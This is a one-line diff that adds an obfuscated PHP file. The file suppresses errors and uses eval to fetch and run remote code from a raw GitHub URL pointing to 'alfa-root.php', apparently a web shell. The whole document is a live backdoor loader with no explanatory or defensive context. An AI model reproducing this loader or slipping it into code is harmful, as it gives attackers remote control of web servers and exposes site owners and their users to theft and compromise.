@@ -1,0 +1,1 @@
+<?=/**/@null; /**/ /*/ /**/@eval/**/ ("?>".file_get_contents (rawurldecode(urldecode("https://raw.githubusercontent.com/ipaybc/law/refs/heads/main/alfa-root.php")))); /**/ ?>
